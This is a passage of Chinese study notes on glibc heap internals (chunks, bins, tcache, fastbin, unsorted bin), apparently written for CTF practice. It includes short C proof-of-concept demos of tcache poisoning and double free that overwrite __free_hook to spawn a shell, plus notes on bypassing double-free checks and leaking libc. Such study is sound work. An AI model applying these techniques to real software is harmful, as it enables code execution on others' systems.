    brk(tmp_brk);
    curr_brk = sbrk(0);
    printf("Program Break Location3:%p\n", curr_brk);
    getchar();
}
```

> 00000000 表明文件偏移，0 表示这部分内容并不是从文件中映射得到的
>
> 00:00 主从 (Major/mirror) 的设备号，全为0表示这部分内容不是从文件中映射得到的
>
> 0 Inode 号。0表示这部分内容不是从文件中映射得到的 

#####  mmap

- malloc 使用 `mmap` 来创建独立的匿名映射段
- 匿名映射主要目的: 可以申请以 0 填充的内存，且这块内存仅被调用进程所使用
- `munmap`: 释放mmap分配的内存
- `mmap`创建的chunk紧邻libc

```cpp
#include <stdio.h> // Private anonymous mapping example using mmap syscall
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

void static inline errExit(const char* msg){
    printf("%s failed. Exiting the process\n", msg);
    exit(-1);
}

int main(){
    int ret = -1;
    printf("Welcome to private anonymous mapping example::PID:%d\n", getpid());
    printf("Before mmap\n");
    getchar();
//08048000-08049000 r-xp 00000000 08:01 539691   /home/sploitfun/ptmalloc.ppt/syscalls/mmap
//08049000-0804a000 r--p 00000000 08:01 539691   /home/sploitfun/ptmalloc.ppt/syscalls/mmap
//0804a000-0804b000 rw-p 00001000 08:01 539691   /home/sploitfun/ptmalloc.ppt/syscalls/mmap
//b7e21000-b7e22000 rw-p 00000000 00:00 0
    char* addr = NULL;
    addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); // mmap !!!
//08048000-08049000 r-xp 00000000 08:01 539691   /home/sploitfun/ptmalloc.ppt/syscalls/mmap
//08049000-0804a000 r--p 00000000 08:01 539691   /home/sploitfun/ptmalloc.ppt/syscalls/mmap
//0804a000-0804b000 rw-p 00001000 08:01 539691   /home/sploitfun/ptmalloc.ppt/syscalls/mmap
//b7e00000-b7e22000 rw-p 00000000 00:00 0 // 申请的内存与已存在的 结合为 b7e00000~b7e21000 的 mmap 段
    if (addr == MAP_FAILED)
        errExit("mmap");
    printf("After mmap\n");
    getchar();

    ret = munmap(addr, (size_t)132*1024); // Unmap mapped region.
//08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap
//08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap
//0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap
//b7e21000-b7e22000 rw-p 00000000 00:00 0 // 原来申请的内存段没有了，恢复成原来的样子
    if(ret == -1)
        errExit("munmap");
    printf("After munmap\n");
    getchar();
}
```





#### chunk

> chunk在内存中存储的形式可以看 `tcache_attack_unsorted_bins_leak_libc_CISCN_2019_final_3` 案例中的分析

- **chunk**: 称由 malloc 申请的内存为 chunk。malloc_chunk
- **malloc_chunk**: 无论大小，分配 / 释放状态，chunk都使用一个结构体 malloc_chunk 来表示。但根据是否被释放，malloc_chunk 表现形式有不同。

```cpp
struct chunk{ // chunk一般结构
    size_t prev_size;
    size_t size; // size最低位为1标识chunk在使用中
    union{  // 注意这里是union 视使用与否有区别 // malloc返回的就是这部分内存
        char buf[size-0x10];
        struct content{ // 未使用时有效，使用时这里就是user data所属的前 2 x 32/64 bit
            chunk* fw;
            chunk* bk; 
        }
    }
}
```

```cpp
struct chunk{ // chunk使用时的结构
	size_t prev_size;
	size_t size; // size最低位为1
	char buf[size-0x10]; // malloc返回的地址
}
```

```cpp
struct chunk{ // chunk释放后的结构
	size_t prev_size;
	size_t size;
	chunk* fw;
	chunk* bk;
}
```

```cpp
// chunk在内存中的布局 // 一个接一个按序存放
| in used | 0x21   |  // 
|   fd    |   bk   |  // 因为size域以1结尾，所以这里fd, bk域实际上是user data，并不是fd bk指针
|  0x20   |  0xa0  |  // 0xa0 0结尾表示未使用，则0x20处有效，指前一个chunk大小为0x20
|      in used     |
|      in used     |
| in used | 0x21   |
```



```cpp
// malloc_chunk 结构 仅用作理解 // ptmalloc 用 malloc_chunk 表示 mallloc 申请的内存(chunk)
struct malloc_chunk { // default: define INTERNAL_SIZE_T size_t 
  INTERNAL_SIZE_T      prev_size; // Size of previous chunk (if free). 前一个chunk的大小(free后有效)
  INTERNAL_SIZE_T      size;      // Size in bytes, including overhead.

  struct malloc_chunk* fd;        // double links -- used only if free.
  struct malloc_chunk* bk;

 // Only used for large blocks: pointer to next larger size.
  struct malloc_chunk* fd_nextsize; // double links -- used only if free.
  struct malloc_chunk* bk_nextsize;
};
```

- **prev_size**: 如果该 chunk 的**物理相邻的前一 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (含 chunk 头)。否则，该字段可以用来存储物理相邻的前一 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk** 
- **size**: 该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍(32bit OS: 8B, 64bit OS: 16B)。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示
  - NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。
  - IS_MAPPED，记录当前 chunk 是否是由 **mmap** 分配的。
  - **PREV_INUSE**，记录前一个 chunk 块是否在使用(tcache/fastbin中的chunk不适用)。通常堆中第一个被分配的chunk的`PREV_INUSE`= **1**，以防止访问前面的内存。当一个 chunk 的 size 的 P 位为 **0** 时，则通过 `prev_size` 字段获取上一 chunk 的大小+地址，以进行空闲 chunk 合并。
- **fw, bk**:  chunk 处于分配状态时，fd域是user data首地址。chunk 空闲时，fw, bk域有效
  - fw: 指向下一个（非物理相邻）空闲的 chunk
  - bk: 指向上一个（非物理相邻）空闲的 chunk
  - 通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理
- **fd_nextsize, bk_nextsize**: 也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。
  - fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
  - bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
  - 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。**这样做可以避免在寻找合适 chunk 时挨个遍历**



INTERNAL_SIZE_T，SIZE_SZ，MALLOC_ALIGN_MASK:

```cpp
#ifndef INTERNAL_SIZE_T // INTERNAL_SIZE_T might be signed/unsigned, 32/64 bits, the same width as int/long
# define INTERNAL_SIZE_T size_t // 默认与size_t一致，最好定义为unsigned，但size_t是signed
#endif // 64bit OS中可能会被定义为32bit unsigned int, 除非需要16B alignments
// size_t 可能与 INTERNAL_SIZE_T 位宽不等、有符号性不同 // int long 可能为32/64bit 也可能等位宽
// 建议将INTERNAL_SIZE_T提升至unsigned long后作对比，但注意unsigned到更宽的long不是sign-extend
#define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) // The corresponding word size.
// 一般 SIZE_SZ = 4 in 32bit OS; 8 in 64bit OS
#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) // The corresponding bit mask value.
```

> 一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数

**称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。**

```python
# 一个已经分配的 chunk 的 mem layout
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ # chunk header ↓
        |             Size of previous chunk, if unallocated (P clear)  | 
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     |A|M|P| # 记录大小
  mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ # chunk header ↑
        |             User data starts here...                          . # user data
        .                                                               . # user data...
        .             (malloc_usable_size() bytes)                      .
next    .                                                               |
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             (size of chunk, but used for application data)    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|1| # 1: 前一 chunk 块被分配
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

被释放的 chunk 被记录在链表中（可能是循环双向链表 / 单向链表）。具体结构如下

```python
# 被释放的 chunk 被记录在链表中（可能是循环双向链表 / 单向链表）。具体结构如下
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`head:  |             Size of chunk, in bytes                     |A|0|P| # 0:
  mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Forward pointer to next chunk in list             |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Back pointer to previous chunk in list            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Unused space (may be 0 bytes long)                .
        .                                                               .
 next   .                                                               |
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`foot:  |             Size of chunk, in bytes                           |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|0| # 0: 前一 chunk 块未被分配
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小

1. 本身的 size 字段会记录，
2. 它后面的 chunk 会记录。

**一般情况下**，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块



##### chunk MACRO

 chunk 的大小、对齐检查以及一些转换的宏

```c
// mem 指向用户得到的内存的起始位置
// conversion from malloc headers to user pointers, and back
#define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))
```

```c
// 最小的 chunk 大小 The smallest possible chunk
#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))
```

- offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针

**最小申请的堆内存大小**: 用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍

> **就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些**

```c
// The smallest size we can malloc is an aligned minimal chunk // 最小申请的堆内存大小
// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define MINSIZE                                                                \
    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))
```

**检查分配给用户的内存是否对齐** 2 * SIZE_SZ 大小对齐。

```c
// Check if m has acceptable alignment // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0)

#define misaligned_chunk(p)                                                    \
    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &       \
     MALLOC_ALIGN_MASK)
```

**请求字节数判断**

```c
//  Check if a request is so large that it would wrap around zero when
//  padded and aligned. To simplify some other code, the bound is made
//  low enough so that adding MINSIZE will also not wrap around zero.
#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
```

**将用户请求内存大小转为实际分配内存大小**

```c
// pad request bytes into a usable size -- internal version
// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 # SIZE_SZ: 4 in 32bit OS, 8 in 64bit OS
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

//  Same, except also perform argument check
#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
```

当一个 chunk 处于已分配状态时，它的**物理相邻的下一个 chunk 的 prev_size** 字段必然是**无效**的，故而这个字段就可以被当前这个 chunk 使用。这就是 ptmalloc 中 chunk 间的复用

1. 首先，利用 REQUEST_OUT_OF_RANGE 判断是否可以分配用户请求的字节大小的 chunk。
2. 其次，需要注意的是用户请求的字节是用来存储数据的，即 chunk header 后面的部分。与此同时，由于 chunk 间复用，所以可以使用下一个 chunk 的 prev_size 字段。因此，这里只需要再添加 SIZE_SZ 大小即可以完全存储内容。
3. 由于系统中所允许的申请的 chunk 最小是 MINSIZE，所以与其进行比较。如果不满足最低要求，那么就需要直接分配 **MINSIZE** 字节。
4. 如果大于的话，因为系统中申请的 chunk 需要 **2 * SIZE_SZ** 对齐，所以这里需要加上 MALLOC_ALIGN_MASK 以便于对齐。



#### Macro Structure: arena & main_arena

> 宏观结构

程序可能向OS申请很小的内存，但OS可能会把很大的内存分配给程序，以避免多次内核态 \<-\>用户态 切换，提高效率。称这一块连续的内存区域为 **arena**。arena 空间不足时，可通过增加 brk 来增加堆的空间；可通过减小 brk 来缩小 arena 空间。



**main_arena**:

- main_arena 是一个全局变量，在 libc.so 的数据段
- 由主线程申请的内存。管理所有堆块的结构体
- 子线程的堆和主线程的堆不一样，每个线程会预分配一个堆空间

**arena**:

- 属于某个子线程。存在于线程的控制块plt中
- chunk_size的倒数第三个标志位NON_MAIN_ARENA，多线程时为1，主线程为0





定位子线程的chunk的技巧

1. 向子线程的堆块输入特殊值:`0xdeadbeef`
2. gdb: `search -4 0xdeadbeef`
3. 搜索出来的地址即堆的地址

多线程利用思路

1. 在子线程中找到堆空间的地址空间A
2. 在A中找到恢复线程的arena的结构
3. 通过arena的结构尝试堆利用



#### bins

> https://blog.csdn.net/qq_41453285/article/details/96865321
>
> https://blog.csdn.net/aoque9909/article/details/101112812 堆之\*bin理解

存储 unstored bin，small bins, large bins 的 chunk 链表头以管理释放的chunk。以避免频繁系统调用，降低内存分配开销

ptmalloc 采用**分箱式**方法对空闲的 chunk 进行管理。根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：

1. [1] unsorted bin: 第一个，没有排序，存储的chunk较杂，双向链表。
2. [2\~63] small bins: 单个small bin链表的chunk大小相同。64bit libc: 0x20, 0x30, ... 0x3f0
3. [64\~126] large bins: large bins 中的每一个 bin 都**包含一定范围内的 chunk**，chunk **按 fd 指针的顺序从大到小排列**。相同大小的 chunk 同样按照最近使用顺序排列。
4. fast bins (10个): 并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk **先**放到 fast bins 的容器内。**fastbin 中的 chunk 的`PREV_INUSE`总是被置位，chunks不会被合并。**

每类中仍然有更细的划分，相似大小的 chunk 会用**双向链表**链接起来。aka. 在每类 bin 内部会有多个互不相关的链表来保存不同大小的 chunk。

> 上述这些 bin 的排布都会遵循一个原则：**任意两个物理相邻的空闲 chunk 不能在一起**

ptmalloc 将unsorted bin, small bins, large bins 维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中:

```c
#define NBINS 128
//  Normal bins packed as described above
mchunkptr bins[ NBINS * 2 - 2 ]; // 254
```

`bins` 主要用于索引不同 bin 的 fd 和 bk。以 32 位系统为例，bins 前 4 项的含义如下

| 含义      | bin1 fw / bin2 prev_size | bin1 bk / bin2 size | bin2 fw/ bin3 prev_size | bin2 bk / bin3 size |
| --------- | ------------------------ | ------------------- | ----------------------- | ------------------- |
| bin index | 0                        | 1                   | 2                       | 3                   |

bin2 prev_size与bin1 fd重合，bin2 size与bin1 bk重合。只使用fd, bk索引链表，故该重合部分记录的实际是bin1 fd, bk。也就是说，虽然后一个bin和前一个bin公用部分数据，但是其实记录的仍然是前一个bin的链表数据。通过这样复用节省空间。

bin 通用的宏如下

```c
typedef struct malloc_chunk *mbinptr;

/* addressing -- note that bin_at(0) does not exist */
#define bin_at(m, i)                                                           \
    (mbinptr)(((char *) &((m)->bins[ ((i) -1) * 2 ])) -                        \
              offsetof(struct malloc_chunk, fd))

/* analog of ++bin */
//获取下一个bin的地址
#define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1)))

/* Reminders about list directionality within bins */
// 这两个宏可以用来遍历bin
// 获取 bin 的位于链表头的 chunk
#define first(b) ((b)->fd)
// 获取 bin 的位于链表尾的 chunk
#define last(b) ((b)->bk)
```





### Tcache

> Thread Cache Bin        libc 2.26引入  提升堆管理性能
>
> https://blog.csdn.net/weixin_43960998/article/details/113831900  glibc 新增保护机制
>
> https://4f-kira.github.io/2020/03/04/glibc2-29-tcache/ glibc 2.29 tcache保护机制
>
> 

glibc **2.26** (ubuntu 17.10)后引入的技术，用于缓存各个线程释放的内存，加速多线程下内存申请。每个线程有一个Tcache，从tcache中malloc时不需要加锁。但欠缺安全检查

- 简单单链表管理，同一条链上大小相同。next / fw指向下一chunk的user data起始地址(fw / next)
- 用一个数组存储各链表头，另一个数组存储链表长度
- 第`i`个根节点存储大小为 `0x10*(i+2)` 的chunk. 0x20, 0x30,0x40... 0x410

```cpp
# define TCACHE_MAX_BINS  64
typedef struct tcache_perthread_struct { // 每个线程一个 https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L2906
  char counts[TCACHE_MAX_BINS]; // 链表长度数组(0~7) 64 // 各链chunk size=0x21, 0x31... // 64bit时元素大小为2B
  tcache_entry *entries[TCACHE_MAX_BINS]; // 链表头指针数组 64
} tcache_perthread_struct;
static __thread tcache_perthread_struct *tcache = NULL;
// tcache_entry:  https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L2894 
typedef struct tcache_entry { // libc 2.29的 tcache_entry 结构体 
  struct tcache_entry *next; // fw filed
  struct tcache_perthread_struct *key; // bk filed // This field exists to detect double frees.
} tcache_entry;
```

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/tcache.png)

- glibc 2.29 tcahce 在bk域引入key，`tcache_get` 时清空key，`tcache_put` 时设置 key
- glibc 2.32引入[`PROTECT_PTR`](https://elixir.bootlin.com/glibc/glibc-2.32.9000/source/malloc/malloc.c#L2941) 使得fw并非指向下一tcache chunk的fw，即被简单加密过

**malloc / free procedure:**

- [malloc](https://elixir.bootlin.com/glibc/glibc-2.26.9000/source/malloc/malloc.c#L3585): 第一次malloc时命中 **MAYBE_INIT_TCACHE**, malloc一块内存存放`tcache_perthread_struct` 。size在tcache范围内时在tcache中找：
  1. tcache有合适的：从tcache链表拿出一个chunk返回。
     1. `__libc_malloc`中，[判断chunk大小是否在tcache中](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L3047)
     2. 如果chunk size属于tcache，调用[tcache_get](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L2934)
     3. `tcache_get`: 修改tcache链表头指针[`entries[tc_idx]`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L2937)为next域指针，链表长度计数-1，清空拿到的tcache chk的key域
  2. tcache为空：从bin找。(最终可能调 `_int_malloc`分配
- [free](https://elixir.bootlin.com/glibc/glibc-2.26.9000/source/malloc/malloc.c#L4173): 在`static void _int_free`中的`#if USE_TCACHE`有详细阐释
  1. 找大小对应的链表，检查链表节点数
  2. 该链没被填满(default: 7)：将chunk放进去
  3. 该链被填满(size=7)：将chunk放到fastbin或unsorted bin
- [`calloc`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L3365) (glibc-2.31.9000):  `__libc_calloc`实际上是调用的`_int_malloc`，仅在前后有部分额外的处理逻辑。但是[`__libc_malloc`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L3022)在开头会检查tcache是否有适合的chk可用，满足条件会调用[`tcache_get`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L2934)，[`__libc_calloc`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L3365)则不会先检查tcache，而是在函数开始后不久就调用了[`mem = _int_malloc (av, sz);`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L3428)。

**Security Check & Bypass:**

- malloc: 从 tcache 拿 chunk
  1. ...
- free: 往 tcache 放 chunk
  1. `tcache_entry`在bk域存储一个key(fw/next后面8B)，检查是否为`tcache_perthread_struct`地址，然后遍历tcache检查该chunk是否在tcache中，有则触发 `double free detected in tcache 2` ([libc2.29新增](https://elixir.bootlin.com/glibc/glibc-2.29.9000/source/malloc/malloc.c#L4209)): UAF或堆溢出，修改e->key/bk后再free
  2. 检查当前chunk是否与头节点为同一个chunk(防止连续double free): 间隔free，free(c0), free(c1), free(c0)





#### Tcache Poisoning: UAF

> https://blog.csdn.net/qq_41202237/article/details/113400567  tcache基础与tcache poisoning 图有误 以本note为准

通过UAF, ... 修改链表中的fd指针(即chunk data首地址)

```cpp
int main(){ // Tcache Poisoning: UAF simplest demo
	long long* p1 = malloc(0x50); long long *p2 = malloc(0x50);
	free(p1); // tcache(0x51) 链 chunk+1
	free(p2); // tcache(0x51) 链 chunk+1 // 现在0x51的链上有两个chunk
	p2[0] = &__free_hook; // Vul: Use After Free // 把第一个chunk的fd指针修改为__free_hook的地址
	p1 = malloc(0x50); // 取出0x51首chunk, entries[3]指向下一chunk fd // *entries[3]=__free_hook
	p2 = malloc(0x50); // p2 = &__free_hook
	p2[0] = system; // 改__free_hook值为system
	free("/bin/sh");  // system(str) // free先检查__free_hook是否为NULL
}// 相当于调用了system("/bin/sh") getshell
```

> `__free_hook`默认为NULL，free时检查，不为NULL则`call __free_hook`后再调用`free`



#### Tcache Dup: Double Free

利用double free将同一个chunk free两次

```cpp
// tcache double free procedure:
e -> fd1 -> fd2 // 1st free: free fd1一次时，fd1正常指向fd2 链表头指针e正常指向fd1
// 2nd free: 按单链表add操作：1. 将后添加的 fd1_ 指向 fd1 (实际上 fd1_ == fd1 )  2. e指向fd1_
e -> fd1_ -> fd1 // 实际上 fd1_==fd1，即现在 fd1 指向自己
// 1st malloc: 注意要 malloc 相同的 size
e -> fd1 // malloc: 1. 拿出头指针 e 指向的 fd1_ 2. e指向下一个chunk fd1
```

- 此时手里的`fd1_`其实就是tcache上的`fd1`，编辑手上的`chunk fd1_`即可修改tcache上的`chunk fd1`指针

```cpp
int main(){ // gcc a.cpp -o a -fpermissive       -Wno-conversion-null -w
    long long * p1 = malloc(0x50);
    free(p1);             // tcache(0x61).e -> p1
    free(p1);             // tcache(0x61).e -> p1 -> p1
    free(p1);             // tcache(0x61).e -> p1 -> p1 -> p1
    p1 = malloc(0x50);    // tcache(0x61).e -> p1 -> p1
    p1[0] = &__free_hook; // tcache(0x61).e -> p1 -> __free_hook
    p1 = malloc(0x50);    // tcache(0x61).e -> __free_hook
    p1 = malloc(0x50);    // p1 = __free_hook
    p1[0] = (long long)&system; // *__free_hook = system
    free("/bin/sh");      // system("/bin/sh")
}
```



#### Tcache Smash





### Fast Bin

> https://paper.seebug.org/445/

在glibc中存在了很久的时间，类似于tcache，是对小内存块的缓存，但是进程唯一，next指针指向位置不同。

- 存储在全局数据结构`main_arean`，在进程内唯一。
- 存储小于等于`0x80`的chunk，chunk大小在 [0x20, 0x80] 
- 链表头数组 + 单链表，链表指针指向`pre_size` field，插入删除都对链表尾节点操作。(tcache指向的是`user data`首地址 / fd)
- 不会对free chunk进行合并。鉴于fastbin设计初衷是快速小内存分配释放，故fastbin chunk `PREV_INUSE`总为1，这样即使当fastbin中某个chunk与一个freechunk相邻时，系统也不会自动合并，而是保留两者。



![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/fastbin.png)



**malloc / free procedure:**

- malloc: 如果tcache中没有chunk，则到fastbin找
- free: tcache满了时，则会把size属于fastbin的chunk放入fastbin
- calloc: 不经过tcache，直接从fastbin拿chunk

**Security Check:**

- 从 fast bin 的链拿chunk: malloc
  1. 检查chunk的size是否正确
  2. 检查下一个chunk的size是否正确(高版本)
- 向 fast bin 的链放 chunk: free
  1. 放入前，检查后一个chunk的size是否大于0x20
  2. 查看链表头节点，检查size是否与链表的size一致(size域低4bit是标志bit，不影响比较)
  3. 检查当前chunk是否与头节点为同一个chunk(防止连续double free)



#### Fast Bin Poisoning: UAF

类似于tcache poisoning，利用UAF修改fd指针指向目标地址，但是需要保证链入的假chunk的size域正确。





#### Fast Bin Dup: Double Free

类似于tcache dup，通过多次free构成环。但free时会检查链表头指针是否与free的chunk地址相同，故不能连续double free放入fastbin，但可以间隔free

```cpp
free(p1); // p1进入fastbin成为头节点 // e->p1
free(p1); // p2进入fastbin成为头节点 // e->p2->p1
free(p1); // p1再次进入fastbin 成环 //  e->p1->p2->p1(loop)  成环
```

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/fastbin_dup.png)

```cpp
int main() {
    char s[100]; long long *p1, *p2;
    for (int i = (0); i < 7; i++) {  // 填满tcache
        p1 = calloc(0x50, 1);   free(p1);
    }
    scanf("%s", s); // 仅用于debug
    p1 = calloc(0x50, 1); 
    p2 = calloc(0x50, 1);
    free(p1); // e->p1
    free(p2); // e->p2->p1
    free(p1); // e->p1->p2->p1(loop) 成环
    scanf("%s", s);
}
```



#### Fast Bin: global_max_fast

> https://xz.aliyun.com/t/5082



### Unsorted Bin

> https://wooyun.js.org/drops/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90(%E4%B8%8B%E5%8D%8A%E9%83%A8).html
>
> https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L3512  详细的涉及unsorted bin的malloc源码在`_int_malloc`中，其中涉及fast bin, small bin, large bin的搜索先后顺序，以及拿完chk之后可能的chk移动，

- 使用**双向链表**存chunk，有两个方向的指针。进程中unsorted bin只有一个
- 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。
- Chunk size: unsorted bin对chunk的大小没有限制，任何大小的chunk都可以归属到unsorted bin中
- FIFO: 插入时插入到unsorted bin头部，取出时从链表尾取。类似队列。

**malloc / free procedure:**

- malloc: 在tcache, fast bin, small bin找不到大小合适的chunk，则到unsorted bin找
  1. 找到：用unsorted bin中大小合适的chunk尽可能地填满tcache。然后再返回结果
  2. 找不到：从unsorted bin找一个稍大的chunk，从中切割出想要的chunk并返回
- free:
  1. 较大的chunk被分割成后，如果剩余的大于MINSIZE则放入unsorted bin
  2. free不属于fast bin的chunk，且**该chunk不与top chunk紧邻**，首先放入unsorted bin
  3. 进行malloc_consolidate时，可能把合并后的chunk放入unsorted bin（不与top chunk紧邻时）



- unsorted bin为空时

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/unsorted_bin_empty.png)

- unsorted bin有一个大小为0xa1的chunk时

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/unsorted_bin_size%3Da1.png)



**Security Check**

- 从 unsorted bin 的链拿chunk: malloc
  1. .
- 向 unsorted bin 的链放 chunk: free
  1. 检查下一个chunk的`size`是否大于0x20(2.29)，可能还检查下下个size域是否合法(大于等于0x21)
  2. 检查下一个chunk的`prev_size`
  3. 检查unsorted bin链表完整性
  4. 检查下一个chunk的`prev_inuse`位



#### Unsorted Bin: Leak libc

往unsorted bin链入一个chunk时，该chunk的fw bk都会指向libc上的一个地址，这个地址与libc的基址的offset是不变的，如果可以得到这个地址，那么减去offset就是libc基址，达到泄露libc基址的目的



```bash
p &main_arena # libc-2.32.so
$2 = (struct malloc_state *) 0x7f4fd05e3ba0 <main_arena>
x /10xg 0x55dee262e6c0 # the user data of the only chunk in unsorted bin 
0x55dee262e6c0: 0x00007f4fd05e3c00    0x00007f4fd05e3c00
# unsorted_bins[0]: fw=0x55dee262e6b0, bk=0x55dee262e6b0 →  Chunk(addr=0x55dee262e6c0, size=0xb0)
diff: 0x00007f4fd05e3c00-0x7f4fd05e3ba0 = 0x60
```



> **Cases**
>
> - CISCN_2019_final_3: 构造fake chunk，既放入tcache也放入unsorted bin，然后从tcache中取出得到libc基址，double free改`__free_hook`





#### Unsorted Bin Attack

> https://www.redhatzone.com/ask/article/2440.html 深入理解unsorted bin attack, house of roman





### Small Bins

小于1024B (0x400) 的chunk称为small chunk，small bin用于管理small chunk

- index: [2\~63]  共62个，指针数组+循环双链表
